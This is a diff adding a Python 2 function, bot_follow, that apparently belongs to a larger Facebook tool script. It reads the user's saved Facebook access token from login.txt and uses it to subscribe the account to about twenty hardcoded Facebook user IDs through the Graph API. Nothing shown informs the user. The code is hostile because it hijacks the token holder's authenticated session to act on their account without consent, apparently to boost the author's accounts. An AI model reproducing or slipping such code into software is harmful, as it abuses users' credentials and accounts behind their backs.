@@ -1,0 +1,26 @@
+def bot_follow():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"   [!] Token invalid"
+		log_token() 
+	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)
+	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100053093889653/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100037914692898/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/1676993425/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100057755937035/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/1673250723/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100002565109395/subscribers?access_token=' + toket)
+	publik()
